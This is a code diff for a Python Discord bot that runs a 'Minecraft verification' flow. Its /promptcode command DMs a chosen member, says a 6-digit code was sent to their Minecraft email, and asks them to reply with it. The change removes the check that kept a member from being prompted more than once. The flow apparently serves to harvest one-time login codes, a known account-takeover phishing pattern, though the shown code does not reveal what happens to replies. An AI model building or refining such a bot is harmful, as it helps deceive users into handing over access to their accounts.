@@ -7,7 +7,6 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 VERIFICATION_CHANNEL_ID = 1362951881827160295
 MOD_CHANNEL_ID = 1362997933552959558
 LAST_VERIFICATION_MSG_FILE = "last_verification_msg.json"
-SENT_DM_FILE = "sent_dm.json"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -16,7 +15,6 @@ intents.dm_messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Persistent sets
 sent_invalid_codes = set()
 
 def load_last_verification_msg_id():
@@ -32,17 +30,6 @@ def save_last_verification_msg_id(msg_id):
         json.dump({"last_verification_msg_id": msg_id}, file)
         print(f"Saved last_verification_msg_id: {msg_id}")
 
-def load_sent_dm_ids():
-    if os.path.exists(SENT_DM_FILE):
-        with open(SENT_DM_FILE, "r") as f:
-            return set(json.load(f))
-    return set()
-
-def save_sent_dm_ids(sent_set):
-    with open(SENT_DM_FILE, "w") as f:
-        json.dump(list(sent_set), f)
-
-sent_verification_dms = load_sent_dm_ids()
 last_verification_msg_id = load_last_verification_msg_id()
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
@@ -103,14 +90,10 @@ async def setup(interaction: discord.Interaction):
 
 @bot.tree.command(name="promptcode")
 async def promptcode(interaction: discord.Interaction, user: discord.Member):
-    if user.id in sent_verification_dms:
-        await interaction.response.send_message("✅ Already sent the prompt.", ephemeral=True)
-        return
-
     try:
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
-            description=(
+            description=( 
                 "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                 "Reply to this DM with the code to complete verification.\n\n"
                 "🔒 Your info is private. Don't share your code."
@@ -118,8 +101,6 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
             color=discord.Color.blue()
         )
         await user.send(embed=embed)
-        sent_verification_dms.add(user.id)
-        save_sent_dm_ids(sent_verification_dms)
         await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
     except discord.errors.Forbidden:
         await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)
